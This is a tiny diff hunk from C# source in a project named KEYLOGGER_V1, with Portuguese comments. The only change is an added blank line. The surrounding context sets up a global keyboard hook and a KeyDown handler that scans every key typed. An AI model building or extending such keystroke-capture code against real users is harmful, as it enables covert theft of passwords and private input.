@@ -329,6 +329,7 @@ namespace KEYLOGGER_V1
         //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN
         globalKeyboardHook gkh = new globalKeyboardHook();
 
+
         void gkh_KeyDown(object sender, KeyEventArgs e)           //EVENTO: do HOOK para scaneamento das teclas
         {
             // TEXTO com todos as Teclas nomeadas.
